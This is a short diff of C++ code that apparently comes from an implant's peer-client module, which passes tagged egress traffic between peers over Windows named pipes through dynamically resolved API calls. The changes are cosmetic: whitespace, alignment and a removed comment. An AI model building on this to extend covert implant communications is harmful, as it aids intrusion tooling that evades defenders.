@@ -24,7 +24,7 @@ namespace Clients {
         _client *prev       = { };
         _client *head       = Ctx->clients;
         _client *target     = GetClient(peer_id);
-        bool success        = true;
+        bool    success     = true;
 
         if (!head || !target) {
             success_(false);
@@ -87,6 +87,7 @@ namespace Clients {
                 }
             }
         }
+
         do {
             if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                 if (total) {
@@ -94,7 +95,6 @@ namespace Clients {
                         Ctx->nt.NtClose(handle);
                         success_(false);
                     }
-
                     if (!Ctx->win32.ReadFile(handle, buffer, total, R_CAST(LPDWORD, &read), nullptr) || read != total) {
                         Ctx->nt.NtClose(handle);
                         success_(false);
@@ -110,7 +110,7 @@ namespace Clients {
         }
         while (true);
 
-        client = R_CAST(_client*, x_malloc(sizeof(_client)));
+        client              = R_CAST(_client*, x_malloc(sizeof(_client)));
         client->pipe_handle = handle;
 
         x_memcpy(&client->peer_id, &peer_id, sizeof(uint32_t));
@@ -158,13 +158,11 @@ namespace Clients {
             if (Ctx->win32.PeekNamedPipe(client->pipe_handle, &bound, sizeof(uint8_t), nullptr, R_CAST(LPDWORD, &read), nullptr) || read != sizeof(uint8_t)) {
                 continue;
             }
-            // get total length
             if (!Ctx->win32.PeekNamedPipe(client->pipe_handle, nullptr, 0, nullptr, R_CAST(LPDWORD, &total), nullptr)) {
                 continue;
             }
 
             if (bound == EGRESS && total >= sizeof(uint32_t)) {
-
                 x_assert(buffer = x_malloc(total));
                 x_assert(in     = Stream::CreateStream());
 
